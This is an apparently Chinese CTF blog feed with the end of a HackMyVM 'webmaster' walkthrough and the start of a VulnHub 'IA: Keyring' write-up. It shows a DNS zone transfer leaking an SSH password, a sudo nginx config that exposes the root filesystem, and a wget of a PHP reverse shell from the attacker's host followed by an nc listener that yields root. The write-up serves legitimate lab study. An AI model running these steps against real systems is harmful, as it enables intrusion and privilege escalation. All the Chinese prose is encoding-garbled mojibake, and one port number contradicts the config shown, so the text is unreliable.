&lt;&lt;&gt;&gt; 192.168.179.226</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 27766</span><br><span class="line">;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;192.168.179.226.		IN	A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">192.168.179.226.	0	IN	A	192.168.179.226</span><br><span class="line"></span><br><span class="line">;; Query time: 15 msec</span><br><span class="line">;; SERVER: 192.168.179.180#53(192.168.179.180) (UDP)</span><br><span class="line">;; WHEN: Mon Feb 10 10:56:55 CST 2025</span><br><span class="line">;; MSG SIZE  rcvd: 49</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯æˆ‘ç›´æ¥ç”¨æ²¡æœ‰è§£æå‡ºæ¥ï¼Œçœ‹äº†ä¸‹wpï¼Œç”¨äº†dig axfr</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">åœ¨ dig å‘½ä»¤ä¸­ï¼ŒAXFR æ˜¯ä¸€ç§æŸ¥è¯¢ç±»å‹ï¼Œç”¨äºè¯·æ±‚<span class="built_in"> DNS </span>åŒºåŸŸä¼ è¾“ï¼ˆ Authoritative Xerox File Replicationï¼‰ã€‚å®ƒç”¨äºä»ä¸»<span class="built_in"> DNS </span>æœåŠ¡å™¨è·å–æ•´ä¸ª<span class="built_in"> DNS </span>åŒºåŸŸçš„æ‰€æœ‰è®°å½•ï¼Œé€šå¸¸ç”¨äºå¤‡ä»½<span class="built_in"> DNS </span>è®°å½•æˆ–åœ¨ä¸» / è¾…åŠ©<span class="built_in"> DNS </span>æœåŠ¡å™¨ä¹‹é—´åŒæ­¥æ•°æ®ã€‚</span><br></pre></td></tr></table></figure></div>
<p>ç”¨è¿™ä¸ªæœç„¶æŸ¥åˆ°äº†ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# dig axfr @<span class="number">192.168.179.226</span> webmaster.hmv </span><br><span class="line"></span><br><span class="line"><span class="comment">; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian &lt;&lt;&gt;&gt; axfr @192.168.179.226 webmaster.hmv</span></span><br><span class="line"><span class="comment">; (1 server found)</span></span><br><span class="line"><span class="comment">;; global options: +cmd</span></span><br><span class="line">webmaster.hmv.		<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">SOA</span>	ns1.webmaster.hmv. root.webmaster.hmv. <span class="number">2 604800</span> <span class="number">86400 2419200</span> <span class="number">604800</span></span><br><span class="line">webmaster.hmv.		<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">NS</span>	ns1.webmaster.hmv.</span><br><span class="line">ftp.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">CNAME</span>	www.webmaster.hmv.</span><br><span class="line">john.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">TXT</span>	&quot;Myhiddenpazzword&quot;</span><br><span class="line">mail.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">A</span>	<span class="number">192.168.0.12</span></span><br><span class="line">ns1.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">A</span>	<span class="number">127.0.0.1</span></span><br><span class="line">www.webmaster.hmv.	<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">A</span>	<span class="number">192.168.0.11</span></span><br><span class="line">webmaster.hmv.		<span class="number">604800</span>	<span class="keyword">IN</span>	<span class="keyword">SOA</span>	ns1.webmaster.hmv. root.webmaster.hmv. <span class="number">2 604800</span> <span class="number">86400 2419200</span> <span class="number">604800</span></span><br><span class="line"><span class="comment">;; Query time: 59 msec</span></span><br><span class="line"><span class="comment">;; SERVER: 192.168.179.226#53(192.168.179.226) (TCP)</span></span><br><span class="line"><span class="comment">;; WHEN: Mon Feb 10 11:04:54 CST 2025</span></span><br><span class="line"><span class="comment">;; XFR size: 8 records (messages 1, bytes 274)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><code>john.webmaster.hmv.	604800	IN	TXT	&quot;Myhiddenpazzword&quot;</code>è¿™æ¡ä¿¡æ¯æ˜¯å¯ç–‘çš„<br>å°è¯•sshç™»å½•johnè´¦æˆ·ï¼Œæœç„¶å¯ä»¥ç™»å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh john@<span class="number">192.168</span>.<span class="number">179.226</span>      </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.179.226 (192.168.179.226)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:Pc29l65Be7facFkvVvZRZLlHBJBvwLH5bOciipZXstQ.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.179.226&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">john@<span class="number">192.168</span>.<span class="number">179.226</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux webmaster <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">12</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">152</span>-<span class="number">1</span> (<span class="number">2020</span>-<span class="number">10</span>-<span class="number">18</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sat Dec  <span class="number">5</span> <span class="number">05</span>:<span class="number">38</span>:<span class="number">56</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">john@webmaster:~$ </span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æœ‰ä¸€ä¸ªnginxçš„sudoæŒ‡ä»¤ï¼ŒæŸ¥æŸ¥ææƒæ–¹å¼<br>æ‰¾åˆ°ä¸€ç¯‡æ–‡ç« è¯´å¯ä»¥æŒ‡å®šnginxçš„é…ç½®æ–‡ä»¶ï¼Œä»¿ç…§ç¤ºä¾‹é…ç½®æ–‡ä»¶å†™åˆ©ç”¨é…ç½®æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">john<span class="variable">@webmaster</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /usr/sbin/nginx -c /home/john/nginx.conf</span><br><span class="line">john<span class="variable">@webmaster</span><span class="symbol">:~</span><span class="variable">$ </span>cat nginx.conf </span><br><span class="line">user root;</span><br><span class="line">worker_processes <span class="number">4</span>;</span><br><span class="line">pid /tmp/nginx.pid;</span><br><span class="line">events &#123;</span><br><span class="line">        worker_connections <span class="number">768</span>;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">        server &#123;</span><br><span class="line">                listen <span class="number">1234</span>;</span><br><span class="line">                root /;</span><br><span class="line">                autoindex on;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç„¶ååœ¨webç«¯è®¿é—®1339ç«¯å£å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.226:1234/root/root.txt</span><br><span class="line">HMVnginxpwnd</span><br></pre></td></tr></table></figure></div>

<p>åšå®Œä¹‹ååˆåœ¨ç½‘ä¸Šæ‰¾åˆ°ç¬¬äºŒç§æ€è·¯<br>è¿™ä¸ª&#x2F;var&#x2F;www&#x2F;htmlç«Ÿç„¶æœ‰å†™å…¥æƒé™</p>
<p>æŠŠåå¼¹shellçš„phpæ–‡ä»¶ä¸Šä¼ ä¸Šæ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">python3</span> -<span class="keyword">m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">80</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">179.226</span> - - [<span class="number">10</span>/Feb/<span class="number">2025</span> <span class="number">11</span>:<span class="number">36</span>:<span class="number">35</span>] <span class="string">&quot;GET /php-reverse-shell.php HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">john@webmaster:/var/www/html$ wget <span class="number">192.168</span>.<span class="number">179.83</span>/php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">09</span> <span class="number">22</span>:<span class="number">36</span>:<span class="number">35</span>--  http://<span class="number">192.168</span>.<span class="number">179.83</span>/php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php</span><br><span class="line">Connecting <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">179.83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">5496</span> (<span class="number">5.4</span>K) [application/octet-stream]</span><br><span class="line">Saving <span class="keyword">to</span>: â€˜php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.phpâ€™</span><br><span class="line"></span><br><span class="line">php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php        <span class="number">100</span>%[==============================================&gt;]   <span class="number">5.37</span>K  --.-KB/s    in <span class="number">0</span>s      </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">09</span> <span class="number">22</span>:<span class="number">36</span>:<span class="number">35</span> (<span class="number">26.9</span> MB/s) - â€˜php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.phpâ€™ saved [<span class="number">5496</span>/<span class="number">5496</span>]</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·åœ¨webè®¿é—®è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œæœ¬åœ°ç›‘å¬ï¼Œä¹Ÿèƒ½å¾—åˆ°rootçš„shell<br><img src="https://pic1.imgdb.cn/item/67a975c2d0e0a243d4fdc8d1.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234              </span><br><span class="line">Linux webmaster 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux</span><br><span class="line"> 22:38:55 up  1:03,  1 user,  load average: 0.00, 0.00, 0.04<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">john     pts/0    192.168.179.83   22:08   47.00s  2.57s  2.57s -bash</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure></div>

<p>æ€»ç»“ï¼š æˆ‘å­¦åˆ°çš„ï¼šdigå¯¹dnsè§£æçš„ä½œç”¨ä»¥åŠdigçš„axfrä½œç”¨ï¼ˆè·å¾—æ•´ä¸ªdnsæœåŠ¡åŒºåŸŸçš„è®°å½•ï¼‰ è¿˜æœ‰nginxçš„sudoææƒï¼Œé€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶å¯ä»¥è®¿é—®ä»»æ„æ–‡ä»¶ã€‚æœ€åæœ‰ä¸€ä¸ªé€šç”¨çš„æ€è·¯å°è¯•&#x2F;var&#x2F;www&#x2F;htmlèƒ½ä¸èƒ½å†™å…¥ï¼Œå¦‚æœå¯ä»¥å°±ä¸Šä¼ åå¼¹shell</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>IA: Keyring</title>
    <url>/posts/8393.html</url>
    <content><![CDATA[<p>vulnhub-IA: Keyringé¶åœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.240.230</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">06</span> <span class="number">18</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.230</span> (<span class="number">192.168</span>.<span class="number">240.230</span>)</span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">8</span>d:eb:fd:<span class="number">0</span>a:<span class="number">76</span>:<span class="number">8</span>a:<span class="number">2</span>a:<span class="number">75</span>:<span class="number">6</span>e:<span class="number">9</span>b:<span class="number">6</span>e:<span class="number">7</span>b:<span class="number">51</span>:c4:<span class="number">28</span>:db (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">53</span>:<span class="number">31</span>:<span class="number">35</span>:c0:<span class="number">3</span>a:a0:<span class="number">48</span>:<span class="number">2</span>f:<span class="number">3</span>a:<span class="number">79</span>:f5:<span class="number">56</span>:cd:<span class="number">3</span>c:<span class="number">63</span>:ee (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">8</span>d:<span class="number">7</span>b:d3:c9:<span class="number">15</span>:<span class="number">61</span>:<span class="number">03</span>:b1:b5:f1:d2:ed:<span class="number">2</span>c:<span class="number">01</span>:<span class="number">55</span>:<span class="number">65</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">29</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span>).</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.29</span> (Ubuntu)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">96</span>:BA:A0:CE:<span class="number">70</span>:B8 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">3</span>.X|<span class="number">4</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">3</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">3.2</span> <span class="operator">-</span> <span class="number">4.14</span></span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.01</span> ms <span class="number">192.168</span>.<span class="number">240.230</span> (<span class="number">192.168</span>.<span class="number">240.230</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.97</span> seconds</span><br></pre></td></tr></table></figure></div>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>è®¿é—®80ç«¯å£ï¼š æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢<br><img src="https://pic1.imgdb.cn/item/67a4c69dd0e0a243d4fc53cd.png"><br>ç›®å½•æ‰«æä¹Ÿå‘ç°çœŸæ­£çš„ç™»å½•ç•Œé¢åœ¨login.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u 192.168.240.230         </span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/tmp/reports/_192.168.240.230/_25-02-06_18-40-23.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.230</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">23</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span>                                    </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">25</span>] <span class="number">302</span> <span class="operator">-</span>  <span class="number">561</span>B  <span class="operator">-</span> <span class="symbol">/about.php</span>  <span class="operator">-&gt;</span>  index.php                         </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">28</span>] <span class="number">302</span> <span class="operator">-</span>  <span class="number">561</span>B  <span class="operator">-</span> <span class="symbol">/control.php</span>  <span class="operator">-&gt;</span>  index.php                       </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">30</span>] <span class="number">302</span> <span class="operator">-</span>  <span class="number">561</span>B  <span class="operator">-</span> <span class="symbol">/home.php</span>  <span class="operator">-&gt;</span>  index.php                          </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">31</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">746</span>B  <span class="operator">-</span> <span class="symbol">/login.php</span>                                        </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">31</span>] <span class="number">302</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/logout.php</span>  <span class="operator">-&gt;</span>  index.php                        </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67a4c69dd0e0a243d4fc53ce.png"><br>å°è¯•ç”¨bpçˆ†ç ´ä¸€ä¸‹å¯†ç  ä½†æ˜¯çˆ†ç ´ä¸å‡ºæ¥<br>ç»§ç»­è¿”å›ä¸»ç•Œé¢ï¼Œå‘ç°è¿™é‡Œç«Ÿç„¶ä¹Ÿå¯ä»¥æ³¨å†Œï¼Œè‡ªå·±è¾“å…¥è´¦å·å¯†ç åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åç™»å½•<br><img src="https://pic1.imgdb.cn/item/67a4c69ed0e0a243d4fc53cf.png"><br>é¡µé¢æé†’å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">HTTP Parameter Pollution <span class="keyword">or</span> HPP <span class="keyword">in</span> short <span class="keyword">is</span> a vulnerability that occurs</span><br><span class="line">due <span class="keyword">to</span> <span class="keyword">passing</span> <span class="keyword">of</span> multiple parameters <span class="keyword">having</span> same <span class="type">name</span></span><br></pre></td></tr></table></figure></div>
<p>å‘Šè¯‰æˆ‘ä»¬æœ‰httpå‚æ•°æ±¡æŸ“æ¼æ´ï¼Œæ‰€ä»¥å°è¯•ç”¨wfuzzè·‘å‚æ•° ä½†æ˜¯æˆ‘æ²¡æœ‰æˆåŠŸ å¯¹wfuzzä¸æ˜¯å¾ˆç†Ÿæ‚‰<br>å»çœ‹äº†ä¸‹ç¾¤ä¸»çš„è§†é¢‘ï¼Œæˆ‘çš„æ€è·¯æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä¹Ÿç¡®å®æ˜¯ç”¨wfuzzï¼Œå°±æ˜¯æˆ‘ç”¨è¿™ä¸ªå·¥å…·æ²¡ç”¨å¯¹<br>è€Œä¸”éœ€è¦å»ç½‘é¡µé‡Œé¢å¾—åˆ°cookie. å¹¶ä¸”ç›®å½•æ²¡æœ‰æ‰«å…¨ï¼Œä»¥åéƒ½ç”¨gobusterè·‘ç›®å½•äº†ã€‚ã€‚ã€‚<br><img src="https://pic1.imgdb.cn/item/67a4c69fd0e0a243d4fc53d0.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># gobuster dir -u 192.168.240.230 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -x .php,.txt,.html -t 50</span></span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span 